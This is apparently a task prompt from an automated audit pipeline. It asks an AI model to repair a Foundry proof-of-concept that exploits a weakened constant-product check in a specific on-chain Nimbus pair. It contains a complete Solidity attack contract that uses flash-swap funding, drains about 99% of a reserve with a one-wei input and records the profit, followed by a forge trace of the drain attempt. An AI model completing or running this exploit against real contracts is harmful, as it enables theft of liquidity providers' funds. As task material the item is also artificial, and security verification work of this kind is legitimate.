You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Swap invariant uses a 10,000-based fee adjustment against a 1,000-based RHS, allowing near-total reserve drainage
- claim: `swap()` computes adjusted balances on a 10,000 scale (`balance*10000 - amountIn*15`) but compares them to `reserve0 * reserve1 * 1000**2` instead of `10000**2`. This weakens the constant-product check by 100x, so traders only need to preserve about 1% of the intended invariant.
- impact: An attacker can drain roughly 99% of either reserve with only a dust-sized counter-input, causing catastrophic LP loss.
- exploit_paths: ["Send a minimal amount of `token0` to the pair, then call `swap(0, reserve1 - reserve1/100, attacker, \"\")`; the weakened K-check still passes.", "Symmetrically, send a minimal amount of `token1`, then call `swap(reserve0 - reserve0/100, 0, attacker, \"\")`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface INimbusPairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint256 internal constant DUST = 1;
    uint256 internal constant RESERVE_DIVISOR = 100;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        INimbusPairLike target = INimbusPairLike(TARGET);
        address token0 = target.token0();
        address token1 = target.token1();

        uint256 baseline0 = IERC20Minimal(token0).balanceOf(address(this));
        uint256 baseline1 = IERC20Minimal(token1).balanceOf(address(this));

        if (baseline0 >= DUST) {
            try this.executeSequence(uint8(1), token0, token1) returns (bool ok) {
                if (ok) {
                    _captureProfit(token0, token1, baseline0, baseline1);
                    if (_profitAmount > 0) {
                        return;
                    }
                }
            } catch {}
        }

        if (baseline1 >= DUST) {
            try this.executeSequence(uint8(2), token0, token1) returns (bool ok) {
                if (ok) {
                    _captureProfit(token0, token1, baseline0, baseline1);
                    if (_profitAmount > 0) {
                        return;
                    }
                }
            } catch {}
        }

        address auxPairForToken0 = _findAuxPair(token0, token1);
        if (auxPairForToken0 != address(0)) {
            try IUniswapV2PairLike(auxPairForToken0).swap(
                _auxAmountOut0(auxPairForToken0, token0),
                _auxAmountOut1(auxPairForToken0, token0),
                address(this),
                abi.encode(uint8(1), auxPairForToken0, token0, token1)
            ) {
                _captureProfit(token0, token1, baseline0, baseline1);
                if (_profitAmount > 0) {
                    return;
                }
            } catch {}
        }

        address auxPairForToken1 = _findAuxPair(token1, token0);
        if (auxPairForToken1 != address(0)) {
            try IUniswapV2PairLike(auxPairForToken1).swap(
                _auxAmountOut0(auxPairForToken1, token1),
                _auxAmountOut1(auxPairForToken1, token1),
                address(this),
                abi.encode(uint8(2), auxPairForToken1, token0, token1)
            ) {
                _captureProfit(token0, token1, baseline0, baseline1);
                if (_profitAmount > 0) {
                    return;
                }
            } catch {}
        }
    }

    function executeSequence(uint8 mode, address token0, address token1) external returns (bool) {
        require(msg.sender == address(this), "self-only");

        if (mode == 1) {
            return _runPathToken0ToDrainToken1(token0);
        }
        if (mode == 2) {
            return _runPathToken1ToDrainToken0(token1);
        }

        revert("bad-mode");
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (uint8 mode, address expectedPair, address token0, address token1) =
            abi.decode(data, (uint8, address, address, address));
        require(msg.sender == expectedPair, "unexpected-pair");

        address borrowedToken =
            amount0 > 0 ? IUniswapV2PairLike(msg.sender).token0() : IUniswapV2PairLike(msg.sender).token1();
        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount >= DUST, "insufficient-borrow");

        if (mode == 1) {
            require(borrowedToken == token0, "wrong-token0-borrow");
            require(_runPathToken0ToDrainToken1(token0), "path1-failed");

            // Direct execution follows the finding's listed path first: transfer minimal token0,
            // then drain ~99% of token1. If the 1 wei seed had to come from a public V2 flash
            // swap, the callback still needs same-token repayment before returning. The mirrored
            // listed path is therefore reused only as a realistic on-chain repayment leg.
            require(_runPathToken1ToDrainToken0(token1), "repay-path-failed");
        } else if (mode == 2) {
            require(borrowedToken == token1, "wrong-token1-borrow");
            require(_runPathToken1ToDrainToken0(token1), "path2-failed");

            // Same rationale, mirrored for the alternate listed exploit direction.
            require(_runPathToken0ToDrainToken1(token0), "repay-path-failed");
        } else {
            revert("bad-mode");
        }

        uint256 repayAmount = _sameTokenFlashRepayment(borrowedAmount);
        require(_safeTransfer(borrowedToken, msg.sender, repayAmount), "repay-failed");
    }

    function _runPathToken0ToDrainToken1(address token0) internal returns (bool) {
        INimbusPairLike target = INimbusPairLike(TARGET);

        (, uint112 reserve1Before,) = target.getReserves();
        if (reserve1Before <= 1) {
            return false;
        }

        uint256 amount1Out = uint256(reserve1Before) - (uint256(reserve1Before) / RESERVE_DIVISOR);
        if (amount1Out == 0 || amount1Out >= reserve1Before) {
            return false;
        }

        if (!_safeTransfer(token0, TARGET, DUST)) {
            return false;
        }

        try target.swap(0, amount1Out, address(this), "") {
            return true;
        } catch {
            return false;
        }
    }

    function _runPathToken1ToDrainToken0(address token1) internal returns (bool) {
        INimbusPairLike target = INimbusPairLike(TARGET);

        (uint112 reserve0Before,,) = target.getReserves();
        if (reserve0Before <= 1) {
            return false;
        }

        uint256 amount0Out = uint256(reserve0Before) - (uint256(reserve0Before) / RESERVE_DIVISOR);
        if (amount0Out == 0 || amount0Out >= reserve0Before) {
            return false;
        }

        if (!_safeTransfer(token1, TARGET, DUST)) {
            return false;
        }

        try target.swap(amount0Out, 0, address(this), "") {
            return true;
        } catch {
            return false;
        }
    }

    function _findAuxPair(address borrowToken, address otherTargetToken) internal view returns (address) {
        address[5] memory quoteCandidates = [otherTargetToken, WETH, USDC, USDT, DAI];
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];

        for (uint256 factoryIndex = 0; factoryIndex < factories.length; ++factoryIndex) {
            for (uint256 quoteIndex = 0; quoteIndex < quoteCandidates.length; ++quoteIndex) {
                address quoteToken = quoteCandidates[quoteIndex];
                if (quoteToken == address(0) || quoteToken == borrowToken) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[factoryIndex]).getPair(borrowToken, quoteToken);
                if (pair == address(0) || pair == TARGET) {
                    continue;
                }

                (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
                if (reserve0 == 0 || reserve1 == 0) {
                    continue;
                }

                if (IUniswapV2PairLike(pair).token0() == borrowToken) {
                    if (reserve0 > DUST) {
                        return pair;
                    }
                } else if (IUniswapV2PairLike(pair).token1() == borrowToken) {
                    if (reserve1 > DUST) {
                        return pair;
                    }
                }
            }
        }

        return address(0);
    }

    function _auxAmountOut0(address pair, address borrowToken) internal view returns (uint256) {
        return IUniswapV2PairLike(pair).token0() == borrowToken ? DUST : 0;
    }

    function _auxAmountOut1(address pair, address borrowToken) internal view returns (uint256) {
        return IUniswapV2PairLike(pair).token1() == borrowToken ? DUST : 0;
    }

    function _sameTokenFlashRepayment(uint256 borrowedAmount) internal pure returns (uint256) {
        return ((borrowedAmount * 1000) / 997) + 1;
    }

    function _captureProfit(address token0, address token1, uint256 baseline0, uint256 baseline1) internal {
        uint256 current0 = IERC20Minimal(token0).balanceOf(address(this));
        uint256 current1 = IERC20Minimal(token1).balanceOf(address(this));

        uint256 gain0 = current0 > baseline0 ? current0 - baseline0 : 0;
        uint256 gain1 = current1 > baseline1 ? current1 - baseline1 : 0;

        if (gain0 >= gain1 && gain0 > 0) {
            _profitToken = token0;
            _profitAmount = gain0;
        } else if (gain1 > 0) {
            _profitToken = token1;
            _profitAmount = gain1;
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool ok) {
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        return success && (data.length == 0 || abi.decode(data, (bool)));
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}

```

forge stdout (tail):
```
b72f], 1)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000f1d8258e9ca9437f24b5e46c017a45ed972896ba
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] true
    │   │   ├─ [103901] FlawVerifier::uniswapV2Call(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 1, 0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000f1d8258e9ca9437f24b5e46c017a45ed972896ba000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000eb58343b36c7528f23caae63a150240241310049)
    │   │   │   ├─ [357] 0xF1d8258e9cA9437F24B5E46c017a45Ed972896bA::token1() [staticcall]
    │   │   │   │   └─ ← [Return] 0xEB58343b36C7528F23CAAe63a150240241310049
    │   │   │   ├─ [2543] 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 82604959 [8.26e7], 280901368924817109893 [2.809e20], 1624704990 [1.624e9]
    │   │   │   ├─ [8598] 0xEB58343b36C7528F23CAAe63a150240241310049::transfer(0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1, 1)
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x000000000000000000000000c0a6b8c534fad86df8fa1abb17084a70f86eddc1
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [88914] 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1::swap(81778910 [8.177e7], 0, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
    │   │   │   │   ├─ [37601] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 81778910 [8.177e7])
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x000000000000000000000000c0a6b8c534fad86df8fa1abb17084a70f86eddc1
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000004dfd8de
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1) [staticcall]
    │   │   │   │   │   └─ ← [Return] 826049 [8.26e5]
    │   │   │   │   ├─ [2817] 0xEB58343b36C7528F23CAAe63a150240241310049::balanceOf(0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1) [staticcall]
    │   │   │   │   │   └─ ← [Return] 280901368924817109894 [2.809e20]
    │   │   │   │   ├─ [2413] 0x56E75d45ea19fA96844C51994Ade3CFf65f3E209::6e81aa63() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000e5ad1a7c9ecfd77c856c211fd5df26a04a72c365
    │   │   │   │   ├─ [5798] 0xEB58343b36C7528F23CAAe63a150240241310049::transfer(0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365, 0)
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x000000000000000000000000c0a6b8c534fad86df8fa1abb17084a70f86eddc1
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000e5ad1a7c9ecfd77c856c211fd5df26a04a72c365
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [18467] 0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365::2a355f7c(000000000000000000000000eb58343b36c7528f23caae63a1502402413100490000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   │   │   ├─ [2817] 0xEB58343b36C7528F23CAAe63a150240241310049::balanceOf(0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 38192307884100767421877 [3.819e22]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Revert] Nimbus: K
    │   │   │   └─ ← [Revert] path2-failed
    │   │   └─ ← [Revert] path2-failed
    │   └─ ← [Stop]
    ├─ [323] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1.swap
  at FlawVerifier.uniswapV2Call
  at 0xF1d8258e9cA9437F24B5E46c017a45Ed972896bA.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.18s (140.57ms CPU time)

Ran 1 test suite in 1.30s (1.18s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 467537)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
